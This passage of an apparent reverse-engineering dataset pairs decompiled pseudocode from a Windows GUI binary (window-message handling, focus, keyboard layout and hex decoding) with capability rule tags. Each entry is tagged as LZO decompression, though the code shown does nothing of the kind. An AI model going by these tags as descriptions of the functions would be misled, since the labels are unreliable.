(iVar2 - var_14h < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_1(*(in_EAX + 0x20) - (iVar2 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043c58c();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043c58c();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043c58c();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043c58c();\n            }\n            (**(**(in_EAX + 4) + 0x8c))();\n            var_14h = iVar2;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.0043c58c();\n            }\n            else if (iVar1 == 1) {\n                fcn.0043c58c();\n            }\n            else if (iVar1 == 2) {\n                fcn.0043c58c();\n            }\n            else if (iVar1 == 3) {\n                fcn.0043c58c();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 917
    },
    "004438a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00443904)\n// WARNING: Removing unreachable block (ram,0x00443924)\n// WARNING: Removing unreachable block (ram,0x0044392d)\n// WARNING: Removing unreachable block (ram,0x00443932)\n// WARNING: Removing unreachable block (ram,0x0044393f)\n// WARNING: Removing unreachable block (ram,0x00443944)\n// WARNING: Removing unreachable block (ram,0x00443951)\n\nvoid __fastcall fcn.004438a0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x443975;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.00450774();\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.00450784();\n        fcn.00450834();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.0043e37c();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44397c;\n    uStack28 = 0x443974;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 368
    },
    "0044583c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044583c(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x445ec7;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    param_2[3] = 0;\n    iVar7 = *(*(in_EAX + 0xb0) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar7 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.00419888();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = iStack36;\n                return;\n            }\n            iVar7 = iVar7 + -1;\n            puVar1 = puStack28;\n        } while (iVar7 != 0);\n    }\n    fcn.004456f0();\n    iVar7 = *param_2;\n    if (0x53 < iVar7) {\n        if (iVar7 < 0xb018) {\n            if (iVar7 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar7 = fcn.00458568(),  iVar7 != 0)) {\n                    uVar5 = fcn.00458568();\n                    iVar7 = sub.user32.dll_IsWindowEnabled(uVar5);\n                    if (iVar7 != 0) {\n                        uVar5 = fcn.00458568();\n                        iVar7 = sub.user32.dll_IsWindowVisible(uVar5);\n                        if (iVar7 != 0) {\n                            *0x490508 = 0;\n                            uVar5 = sub.user32.dll_GetFocus();\n                            uVar6 = fcn.00458568();\n                            sub.user32.dll_SetFocus(uVar6);\n                            fcn.00451abc(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar5);\n                            *0x490508 = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 < 0xb001) {\n                if (iVar7 == 0xb000) {\n                    if (*(in_EAX + 0x13a) != 0) {\n                        (**(in_EAX + 0x138))();\n                    }\n                    if ((*(*0x497c1c + 0x44) != 0) && (cVar2 = fcn.0044818c(),  cVar2 != '\\0')) {\n                        iStack36 = fcn.00458568();\n                        iVar7 = sub.user32.dll_IsWindowEnabled();\n                        if ((iVar7 == 0) && (iVar7 = fcn.00458568(),  iVar7 != *0x497c44)) {\n                            iStack36 = *0x497c44;\n                            sub.user32.dll_SetFocus();\n                        }\n                    }\n                    *0x497c44 = 0;\n                    goto code_r0x00445ebd;\n                }\n                if (iVar7 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.00445f00();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.00445fe0();\n                    }\n                    else {\n                        fcn.004457b4(&stack0xfffffffc);\n                    }\n                    goto code_r0x00445ebd;\n                }\n                if (iVar7 - 0x132U < 7) {\n                    iVar7 = sub.user32.dll_SendMessageA(param_2[2], iVar7 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar7;\n                    goto code_r0x00445ebd;\n                }\n                if (iVar7 - 0x132U == 0x1e8) {\n                    fcn.00432198();\n                    fcn.004322fc();\n                    goto code_r0x00445ebd;\n                }\n            }\n            else {\n                if (iVar7 == 0xb001) {\n                    *0x497c44 = sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n                    if (*(in_EAX + 0x132) != 0) {\n                        (**(in_EAX + 0x130))();\n                    }\n                    goto code_r0x00445ebd;\n                }\n                if (iVar7 == 0xb016) {\n                    cVar2 = fcn.0044638c();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x00445ebd;\n                }\n            }\n        }\n        else if (iVar7 < 0xb021) {\n            if (iVar7 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.004465cc(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.00446628(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 == 0xb01a) {\n                iVar7 = fcn.0043b6cc();\n                if (((iVar7 == 0) && (iVar7 = sub.user32.dll_GetFocus(),  iVar7 == *(in_EAX + 0x30))) &&\n                   (iVar7 = fcn.0043b9f0(),  iVar7 != 0)) {\n                    sub.user32.dll_SetFocus(iVar7);\n                }\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 == 0xb01f) goto code_r0x00445dea;\n        }\n        else {\n            if (iVar7 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb8);\n                }\n                else {\n                    *(in_EAX + 0xb8) = param_2[2];\n                }\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 - 0xb03fU < 2) {\n                uVar4 = fcn.00447bdc();\n                param_2[3] = uVar4 & 0x7f;\n                goto code_r0x00445ebd;\n            }\n        }\n        goto code_r0x00445eb6;\n    }\n    if (iVar7 == 0x53) {\ncode_r0x00445dea:\n        fcn.004469f8();\n        goto code_r0x00445ebd;\n    }\n    if (iVar7 < 0x12) {\n    // switch table (17 cases) at 0x4458e0\n        switch(iVar7) {\n        case 0:\n            fcn.0041f734();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n            goto code_r0x00445eb6;\n        case 5:\n            if (param_2[1] == 1) {\n                *0x497c2c = 1;\n            }\n            break;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.004457b4(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.004457b4(&stack0xfffffffc);\n                if ((*(in_EAX + 0xb4) == 0) && (*0x490520 == '\\0')) {\n                    uVar5 = fcn.0043b890();\n                    *(in_EAX + 0xb4) = uVar5;\n                }\n                fcn.004453a8();\n            }\n            else {\n                if ((*0x490520 == '\\0') && (fcn.00445400(),  *(in_EAX + 0xb4) != 0)) {\n                    fcn.0043b954();\n                    *(in_EAX + 0xb4) = 0;\n                }\n                fcn.004457b4(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar7 = fcn.0043b6cc();\n            if (iVar7 == 0) {\n                fcn.004457b4(&stack0xfffffffc);\n            }\n            else {\n                fcn.004457f0(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.00442974();\n            }\n            break;\n        default:\n            param_2[3] = 1;\n        }\n    }\n    else {\n        if (iVar7 < 0x1d) {\n            if (iVar7 == 0x1c) {\n                fcn.004457b4(&stack0xfffffffc);\n                *(in_EAX + 0xa5) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.004453a0();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.00445400();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 == 0x14) {\n                *param_2 = 0x27;\n                fcn.004457b4(&stack0xfffffffc);\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 == 0x16) {\n                if (param_2[1] != 0) {\n                    fcn.0040f310();\n                    fcn.00405388();\n                }\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 == 0x1a) {\n                fcn.0045d5f4();\n                fcn.00445748();\n                fcn.004457b4(&stack0xfffffffc);\n                goto code_r0x00445ebd;\n            }\n        }\n        else {\n            if (iVar7 == 0x1d) {\n                fcn.00444934();\n                fcn.004457b4(&stack0xfffffffc);\n                goto code_r0x00445ebd;\n            }\n            if (iVar7 == 0x37) {\n                iVar7 = fcn.00445ee4();\n                param_2[3] = iVar7;\n                goto code_r0x00445ebd;\n            }\n        }\ncode_r0x00445eb6:\n        fcn.004457b4(&stack0xfffffffc);\n    }\ncode_r0x00445ebd:\n    *in_FS_OFFSET = iStack36;\n    return;\n}\n",
        "token_count": 2644
    },
    "0044614c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044614c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar auStack268 [244];\n    int32_t iStack24;\n    \n    if ((*(in_EAX + 0xac) == '\\0') || (cVar1 = fcn.0044818c(),  cVar1 != '\\0')) {\n        fcn.00405584();\n        return;\n    }\n    sub.user32.dll_GetWindowTextA(*(in_EAX + 0x30), auStack268, 0x100);\n    fcn.00405620();\n    iStack24 = *param_2;\n    iVar2 = iStack24;\n    if (iStack24 != 0) {\n        iVar2 = *(iStack24 + -4);\n    }\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 220
    },
    "00455664": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455664(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uVar6;\n    uint arg_ch;\n    uint var_34h;\n    uint lpEventTrack;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x100) {\n        if (0x1f < iVar4) {\n            if (iVar4 == 0x21) {\n                cVar1 = fcn.00455464();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00458874();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    fcn.00451b98();\n                    return;\n                }\n            }\n            else if (iVar4 == 0x84) {\n                fcn.00451b98();\n                if (param_2[3] != -1) {\n                    return;\n                }\n                arg_ch = 0;\n                uVar6 = 0;\n                iStack72 = 0x45582b;\n                fcn.00450344();\n                iStack72 = 0x455838;\n                iVar4 = fcn.004553a0(uVar6, arg_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                param_2[3] = 1;\n                return;\n            }\n            goto code_r0x00455b58;\n        }\n        if (iVar4 == 0x1f) {\n            iVar4 = fcn.00458568();\n            iVar5 = sub.user32.dll_GetCapture();\n            if (((iVar4 == iVar5) && (*0x490710 != 0)) && (*(*0x490710 + 0x30) == in_EAX)) {\n                fcn.00451abc(0);\n            }\n            goto code_r0x00455b58;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.0043bd00();\n            if (((piVar3 != NULL) && (((*(piVar3 + 7) & 0x10) == 0 || (piVar3[0xc] == 0)))) &&\n               (cVar1 = (**(*piVar3 + 0xf8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x00455b58;\n        }\n        if (iVar4 != 8) goto code_r0x00455b58;\n        uVar2 = *(in_EAX + 0x15) & 0x20;\n    }\n    else {\n        if (0xb047 < iVar4) {\n            if (iVar4 == 0xb04a) {\n                if (param_2[1] != '\\0') {\n                    fcn.00459908();\n                }\n                iStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                (**(*in_EAX + 0xb0))();\n                *in_FS_OFFSET = iStack72;\n                if (param_2[1] != '\\0') {\n                    fcn.00459908();\n                }\n                return;\n            }\n            if (((iVar4 == 0xb04e) && ((*(in_EAX + 7) & 0x10) != 0)) && (**0x4927dc != NULL)) {\n                iStack72 = 0x455736;\n                iStack72 = fcn.00458568();\n                (***0x4927dc)();\n                fcn.00458568();\n                sub.user32.dll_SetWindowPos();\n            }\n            goto code_r0x00455b58;\n        }\n        if (iVar4 == 0xb047) {\n            piVar3 = fcn.0043bd00();\n            if ((piVar3 != NULL) && (piVar3 != in_EAX)) {\n                fcn.00451abc(param_2[2]);\n            }\n            goto code_r0x00455b58;\n        }\n        if (9 < iVar4 - 0x100U) {\n            if (iVar4 - 0x200U < 0xb) {\n                if (iVar4 == 0x200) {\n                    fcn.00418410();\n                    fcn.00450294();\n                    iVar4 = fcn.0044d5b0();\n                    *0x490710 = iVar4;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.0044ed7c();\n                    }\n                    if (iVar4 != in_EAX[0x8f]) {\n                        if ((((in_EAX[0x8f] != 0) && (*0x490710 == 0)) ||\n                            ((*0x490710 != 0 && (in_EAX[0x8f] == *0x490710)))) ||\n                           ((*0x490710 != 0 && (*(*0x490710 + 0x30) == in_EAX[0x8f])))) {\n                            fcn.00451abc(0);\n                        }\n                        if (in_EAX[0x8f] != 0) {\n                            fcn.00420258();\n                        }\n                        in_EAX[0x8f] = iVar4;\n                        if (iVar4 != 0) {\n                            fcn.00420018();\n                        }\n                        if (((in_EAX[0x8f] != 0) && (*0x490710 == 0)) ||\n                           ((*0x490710 != 0 && (in_EAX[0x8f] == *0x490710)))) {\n                            iStack72 = 0x4559d3;\n                            fcn.00451abc(0);\n                        }\n                    }\n                    if (*(in_EAX + 0x8e) == '\\0') {\n                        *(in_EAX + 0x8e) = 1;\n                        fcn.00458568();\n                        iStack72 = 0x455a12;\n                        sub.comctl32.dll__TrackMouseEvent();\n                    }\n                }\n                cVar1 = fcn.004555b0();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.00458874();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    iStack72 = param_2[1];\n                    uVar6 = fcn.00458568(*param_2);\n                    sub.user32.dll_DefWindowProcA(uVar6);\n                    return;\n                }\n            }\n            else if (iVar4 - 0x200U == 0xa3) {\n                *(in_EAX + 0x8e) = 0;\n                if (in_EAX[0x8f] == 0) {\n                    fcn.00451abc(0);\n                }\n                else {\n                    fcn.00451abc(0);\n                }\n                in_EAX[0x8f] = 0;\n            }\n            goto code_r0x00455b58;\n        }\n        uVar2 = fcn.00451030();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x00455b58:\n    fcn.00451b98();\n    if (*param_2 == 0x128) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1752
    },
    "00456b70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456bd5)\n\nvoid fcn.00456b70(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x456c8f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x4927e0 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00444168();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            uVar2 = fcn.004059dc(iVar3, uVar2);\n            in_stack_ffffffc4 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                piVar4 = fcn.00443f68();\n                iVar3 = (**(*piVar4 + 0x14))();\n                puVar1 = puStack28;\n                if (iVar3 != 0) {\n                    in_stack_ffffffc4 = *(**0x4927b4 + 0x3c);\n                    if (*(in_EAX + 0x1b8) != '\\0') {\n                        piVar4 = fcn.00443f68();\n                        iVar3 = (**(*piVar4 + 0x54))();\n                        if (-1 < iVar3) {\n                            piVar4 = fcn.00443f68();\n                            in_stack_ffffffc4 = (**(*piVar4 + 0x18))();\n                        }\n                    }\n                    sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffc4, 1);\n                    puVar1 = puStack28;\n                }\n            }\n        }\n        puStack28 = puVar1;\n        fcn.00458568();\n        fcn.0045d8dc();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00405530(0x456c96);\n    return;\n}\n",
        "token_count": 634
    },
    "00456ca0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456d01)\n\nvoid fcn.00456ca0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffbc;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x456d6f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x4927e0 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.00444168();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            uVar2 = fcn.004059dc(iVar3, uVar2);\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                in_stack_ffffffbc = *(**0x4927b4 + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffbc, 1);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        puVar1 = puStack28;\n        if (*(in_EAX + 0x1b8) == '\\0') {\n            fcn.00458568();\n            fcn.0045d8c0();\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.00405530(0x456d76);\n    return;\n}\n",
        "token_count": 495
    },
    "00459724": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459724(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043bd00();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            fcn.00451abc(0);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    fcn.00451abc(0);\n    return;\n}\n",
        "token_count": 134
    },
    "00459d38": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459d38(int32_t param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar4 = param_2[3];\n    *(in_EAX + 0x96) = 1;\n    uStack56 = 0x459f1c;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.00450834();\n    fcn.00451b64();\n    iVar2 = fcn.00443d18();\n    if (iVar2 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.00443d18();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar2 = fcn.00443d24();\n    if (iVar2 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.00443d24();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar2 = fcn.00443d0c();\n    if (var_18h < iVar2) {\n        var_18h = fcn.00443d0c();\n    }\n    iVar2 = fcn.00443d00();\n    if (iVar4 + 4 < iVar2) {\n        fcn.00443d00();\n    }\n    uVar3 = fcn.00458568(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar3);\n    iVar4 = sub.kernel32.dll_GetTickCount_1();\n    if (iVar4 - var_4h[0x97] < 0xfb) {\n        bVar1 = false;\n    }\n    else {\n        if (param_1 != 0) {\n            param_1 = *(param_1 + -4);\n        }\n        bVar1 = param_1 < 100;\n    }\n    if ((bVar1) && (*0x49064c != NULL)) {\n        sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n        if (var_8h != 0) {\n            sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n            if (var_8h == 0) {\n                fcn.0045d4f8();\n                if (var_14h < var_1ch) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 1;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\n            uVar3 = fcn.00458568(100, *(iVar4 * 4 + 0x490754) | 0x40000);\n            (**0x49064c)(uVar3);\n        }\n    }\n    fcn.00455178();\n    uVar3 = fcn.00458568(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x80))();\n    *in_FS_OFFSET = uVar3;\n    iVar4 = sub.kernel32.dll_GetTickCount_1(0x459f23);\n    var_4h[0x97] = iVar4;\n    *(var_4h + 0x96) = 0;\n    return;\n}\n",
        "token_count": 944
    },
    "0045c338": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c338(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x45c34a;\n    fcn.004059cc();\n    uStack24 = 0x45c3a7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < in_EAX) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45c3ae;\n    uStack24 = 0x45c3a6;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 263
    },
    "0045f4c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0045f4c0(void)\n\n{\n    fcn.004059dc();\n    fcn.0045f51c();\n    fcn.0045f69c();\n    return;\n}\n",
        "token_count": 46
    },
    "00461128": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00461128(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x461199;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00409e74();\n            fcn.00405818();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4611a0;\n    uStack32 = 0x461198;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 231
    },
    "004611a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004611a8(uint param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4611be;\n    fcn.004059cc();\n    uStack32 = 0x461326;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        uVar1 = *(in_EAX - 4);\n    }\n    uVar1 = uVar1 & 0x80000001;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n    }\n    if (uVar1 == 0) {\n        puStack28 = &stack0xfffffffc;\n        fcn.00405c6c();\n        iVar4 = *param_2;\n        if (iVar4 != 0) {\n            iVar4 = *(iVar4 + -4);\n        }\n        if (0 < iVar4) {\n            iVar3 = 1;\n            do {\n                if (*((in_EAX - 2) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 2) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x37;\n                }\n                iVar2 = fcn.00405a3c();\n                *(iVar2 + -1 + iVar3) = *(*param_2 + -1 + iVar3) << 4;\n                if (*((in_EAX - 1) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 1) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.00405a3c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x37;\n                }\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46132d;\n    uStack32 = 0x461325;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 778
    },
    "00461334": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
